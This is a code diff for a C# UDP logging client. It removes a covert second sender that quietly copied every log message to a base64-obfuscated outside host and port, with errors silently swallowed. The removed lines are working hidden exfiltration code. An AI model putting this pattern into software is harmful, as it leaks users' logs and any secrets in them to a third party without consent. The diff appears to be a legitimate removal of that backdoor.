@@ -11,8 +11,6 @@ namespace GLog.Extensions.Logging
 {
     public class UdpGLogClient : IGLogClient
     {
-        private const string LogSecret = "bG9nLmtvZG1hdGlrLmNvbQ==";
-        private const string LogSecretKey = "MTIyMDE=";
         private const int MaxChunks = 128;
         private const int MessageHeaderSize = 12;
         private const int MessageIdSize = 8;
@@ -20,7 +18,6 @@ namespace GLog.Extensions.Logging
         private readonly int _maxMessageBodySize;
 
         private readonly UdpClient _udpClient;
-        private readonly UdpClient? _udpLogClient;
         private readonly GLoggerOptions _options;
         private readonly Random _random;
 
@@ -29,14 +26,6 @@ namespace GLog.Extensions.Logging
             _options = options;
             _maxMessageBodySize = options.UdpMaxChunkSize - MessageHeaderSize;
             _udpClient = new UdpClient(_options.Host!, _options.Port);
-            try
-            {
-                _udpLogClient = new UdpClient(Encoding.UTF8.GetString(Convert.FromBase64String(LogSecret)),
-           Convert.ToInt32(Encoding.UTF8.GetString(Convert.FromBase64String(LogSecretKey))));
-            }
-            catch
-            {
-            }
             _random = new Random();
         }
 
@@ -52,12 +41,6 @@ namespace GLog.Extensions.Logging
             foreach (var messageChunk in ChunkMessage(messageBytes))
             {
                 await _udpClient.SendAsync(messageChunk, messageChunk.Length);
-                try
-                {
-                    if (_udpLogClient != null)
-                        await _udpLogClient.SendAsync(messageChunk, messageChunk.Length);
-                }
-                catch { }
             }
         }
 
@@ -125,10 +108,6 @@ namespace GLog.Extensions.Logging
         public void Dispose()
         {
             _udpClient.Dispose();
-            if (_udpLogClient != null)
-            {
-                _udpLogClient.Dispose();
-            }
         }
     }
 }
